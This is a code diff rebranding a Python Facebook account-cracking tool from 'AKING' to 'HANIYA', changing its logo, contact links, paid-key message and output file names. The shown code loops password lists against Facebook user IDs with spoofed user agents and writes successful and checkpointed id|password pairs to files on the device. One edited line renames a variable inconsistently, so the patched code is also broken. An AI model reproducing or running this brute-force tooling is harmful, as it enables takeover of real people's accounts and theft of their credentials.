@@ -3,7 +3,7 @@
 #ENJOY GUYS
 from os import path
 import os,base64,zlib,pip,urllib
-os.system('xdg-open https://facebook.com/groups/351076900316263/')
+os.system('xdg-open https://www.facebook.com/profile.php?id=100000332084501/')
 print('\n\033[1;37m install modules...\n It will take some seconds...')
 
 try:
@@ -47,12 +47,12 @@ for agent in range(10000):
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
 logo=("""\033[1;37m
-  .d8b.  db   dD d888888b d8b   db  d888b 
- d8' `8b 88 ,8P'   `88'   888o  88 88' Y8b
- 88ooo88 88,8P      88    88V8o 88 88       \033[1;34m𝐏 \033[1;37m
- 88~~~88 88`8b      88    88 V8o88 88  ooo.\033[1;31m 𝐑\033[1;37m
- 88   88 88 `88.   .88.   88  V888 88. ~8~  \033[1;35m𝐎 \033[1;37m
- YP   YP YP   YD Y888888P VP   V8P  Y888P   
+\033[0;92m  _    _          _   _ _______     __      
+\033[0;93m | |  | |   /\   | \ | |_   _\ \   / //\    
+\033[0;94m | |__| |  /  \  |  \| | | |  \ \_/ //  \   
+\033[0;95m |  __  | / /\ \ | . ` | | |   \   // /\ \  
+\033[0;96m | |  | |/ ____ \| |\  |_| |_   | |/ ____ \ 
+\033[0;97m |_|  |_/_/    \_\_| \_|_____|  |_/_/    \_\  
 ----------------------------------------------
  Author    : HANIYA BALOCH
  Github    : Haniyabaloch0786
@@ -274,7 +274,7 @@ def menu():
                                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                 linex()
                                 input(' Press enter to back ')
-                                os.system('python AKING.py')
+                                os.system('python HANIYA.py')
                         elif xd in ['2','02']:
                                 import dump
                                 dump.Main()
@@ -297,11 +297,11 @@ def menu():
                                 gmail()
                         elif xd in ['6','06']:
                                 wx=('Dsj9JMWoixk4Qsje0Ng3nA')
-                                os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
+                                os.system(f'xdg-open https://www.facebook.com/Shahzadi.Pari786/{wx}');menu()
                         elif xd in ['7','07']:
                                 os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AKING_VPN1.0.apk/file');menu()
                         elif xd in ['8','08']:
-                                os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
+                                os.system('xdg-open https://www.facebook.com/100028391555380/posts/pfbid02g9yszvrt4pY6BaPV2KukCMz9Tk53QBh9qv4EjsJRr9LzLqok7WJjEuR3yxhGczw6l/?app=fbl/?app=fbl');menu()
                         elif xd in ['0','00']:
                                 exit(' Thanks for use 🥰 ')
                         else:
@@ -320,12 +320,12 @@ def menu():
                         linex()
                         print(" Your Subscription Date Expire")
                         linex()
-                        url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
+                        url_wa = "https://api.whatsapp.com/send?phone=+923265989431&text="
                         name = input(" Enter your Name : ")
                         linex()
-                        tks = ("Hi Aking Sir, I Need To Buy Your Paid AKING PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
+                        tks = ("Hi HANIYA MAM, I Need To Buy Your Paid HANIYA PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
-                        print(' Run :  python AKING.py')
+                        print(' Run :  python HANIYA.py')
                         exit()
         except ValueError:
                 exit()
@@ -470,14 +470,14 @@ def ffb(ids,names,passlist):
                         if "c_user" in Aking:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [AKING-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/AKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print('\r\r\033[1;32m [HANIYa-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/HANIYA-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in Aking:
+                        elif 'checkpoint' in Haniya:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;208m [HANIYA-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/HANIYA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
